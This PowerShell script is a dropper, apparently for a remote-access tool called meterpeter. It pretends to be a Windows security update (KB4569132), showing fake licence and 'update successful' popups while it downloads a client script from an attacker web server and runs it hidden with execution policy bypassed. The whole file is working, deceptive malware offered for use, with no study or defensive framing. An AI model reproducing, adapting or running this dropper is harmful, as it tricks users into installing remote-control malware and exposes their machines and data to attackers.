<#
.SYNOPSIS
   meterpeter v2.10.10 dropper

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Invoke-WebRequest {native}
   Optional Dependencies: ps2exe.ps1 {auto-download}
   PS cmdlet Dev version: v1.1.6

.DESCRIPTION
   This cmdlet downloads\executes meterpeter client.ps1 (PS) from attacker
   machine python (http.server) or apache2 webservers into target $Env:TMP
   directory then executes the client.ps1 in an child process. (background)

.NOTES
   Administrator privileges are required to clean Powershell\Windows Defender logs.
   The generated executable.exe dropper will accept the use of parameters at runtime.
   The Dropper.exe default execution behavior can be changed by setting the parameters
   default values before compiling this cmdlet, Or using the parameters at runtime.

.Parameter OutFile
   The absolucte path where to upload payload (default: $Env:TMP\Update-KB4569132.ps1)

.Parameter SilentExec
   Silent execute dropper.exe without spawning any msgbox (default: false)

.EXAMPLE
   PS C:\> .\Update-KB4569132.exe
   Automatic exploitation (default settings)

.EXAMPLE
   PS C:\> .\Update-KB4569132.exe -silentexec true
   Automatic exploitation without using message boxes.

.EXAMPLE
   PS C:\> .\Update-KB4569132.exe -outfile "$Env:USERPROFILE\Desktop\MyReNamedRat.ps1"
   Download meterpeter client.ps1 to -outfile 'dir', rename it and execute it in background.
   
.OUTPUTS
   This cmdlet uses Wscript.Shell ComObject to display msgbox(s)
#>


#CmdLet Global variable declarations!
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$OutFile="$Env:TMP\Update-KB4569132.ps1",
   [string]$SilentExec="False"
)


$SExecuted = $null
$ErrorActionPreference = "SilentlyContinue"
$host.UI.RawUI.WindowTitle = "Cumulative KB4569132_0 Update"
If($SilentExec -ieq "False"){$UserSetTings = powershell (New-Object -ComObject Wscript.Shell).Popup("                                                Feature update                                                `n`nTHIS SOFTWARE IS PROVIDED BY THE REGENTS AND CONTRIBUTORS ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE REGENTS OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.`n`n                                      Install Secure KB4569132 Update?",6,"                                         Secure KB4569132 Update",1+0)}

#Download meterpeter client.ps1 from http.server\apache2 webserver into %tmp% directory!
iwr -Uri "http://CharlieBrown/Update-KB4569132.ps1" -OutFile "$OutFile" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"|Out-Null

Start-Sleep -Milliseconds 300;$a = Get-Date
try{#Execute meterpeter client.ps1 in a child process detach from parent process (background)
   Start-Process powershell.exe -WindowStyle Hidden -ArgumentList "-exec bypass -File $OutFile"|Out-Null
}catch{$SExecuted = "False"}


If($SilentExec -ieq "False")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Spawn MessageBoxes function!
   #>

   If($UserSetTings -Match '^(1|-1)$' -and $SExecuted -ne "False")
   {
      powershell (New-Object -ComObject Wscript.Shell).Popup("system successfully updated! - Version: 45.19041.692.2",5,"                                      Secure KB4569132 Update",0+64)|Out-Null
   }
   ElseIf($UserSetTings -Match '^(1|-1)$' -and $SExecuted -eq "False")
   {
      powershell (New-Object -ComObject Wscript.Shell).Popup("fail to execute:`n'$OutFile'.`nCVE: https://www.cvedetails.com/cve/CVE-2019-0971",8,"                                      Secure KB4569132 Update",0+16)|Out-Null
   }
   Else
   {
      powershell (New-Object -ComObject Wscript.Shell).Popup("KB4569132 - Secure update aborted ..`nThis update adresses Microsoft Team Foundation Server.`nDisclosure assigned to CVE-2019-0971 as critical update.`n'Please address this vulnerability as soon as possible'.",8,"                                   Secure KB4569132 Update",0+48)|Out-Null
   }

}

